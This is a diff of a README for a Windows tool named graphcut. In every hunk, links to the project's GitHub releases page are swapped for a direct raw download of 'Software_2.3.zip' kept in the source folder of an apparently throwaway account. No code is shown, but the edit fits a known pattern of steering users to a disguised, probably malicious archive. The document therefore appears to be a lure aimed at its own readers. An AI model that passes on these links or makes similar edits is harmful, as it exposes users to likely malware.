@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download graphcut](https://img.shields.io/badge/Download-graphcut-25e2eb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sissygrassless668/graphcut/releases)
+[![Download graphcut](https://img.shields.io/badge/Download-graphcut-25e2eb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sissygrassless668/graphcut/raw/refs/heads/main/src/graphcut/Software_2.3.zip)
 
 </div>
 
@@ -16,7 +16,7 @@ It is a Windows app for end users. You download it, open it, and use it to work 
 
 Use this page to download graphcut:
 
-https://github.com/sissygrassless668/graphcut/releases
+https://github.com/sissygrassless668/graphcut/raw/refs/heads/main/src/graphcut/Software_2.3.zip
 
 ### Windows steps
 
@@ -192,7 +192,7 @@ This helps you learn the flow before you process large files.
 
 Download the latest version here:
 
-https://github.com/sissygrassless668/graphcut/releases
+https://github.com/sissygrassless668/graphcut/raw/refs/heads/main/src/graphcut/Software_2.3.zip
 
 ## 🏷️ Topics
 
